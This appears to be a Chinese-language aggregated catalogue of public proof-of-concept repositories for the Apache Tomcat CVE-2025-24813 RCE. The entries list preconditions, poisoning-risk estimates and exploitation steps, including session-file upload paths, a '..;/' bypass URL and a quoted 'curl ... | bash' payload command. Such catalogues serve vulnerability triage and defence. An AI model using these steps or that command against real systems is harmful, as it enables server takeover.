**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

